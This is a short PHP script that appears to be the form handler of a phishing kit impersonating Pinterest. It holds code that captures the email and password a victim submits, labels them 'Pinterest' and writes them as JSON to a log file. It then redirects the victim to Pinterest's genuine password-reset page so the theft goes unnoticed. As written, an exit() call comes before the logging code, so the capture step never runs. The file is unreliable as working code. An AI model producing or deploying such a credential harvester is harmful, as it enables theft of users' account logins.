<?php

header('Location: https://www.pinterest.com/password/reset/');

exit();
$data = array('site' => 'Pinterest',
  'user' => $_POST['email'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
?>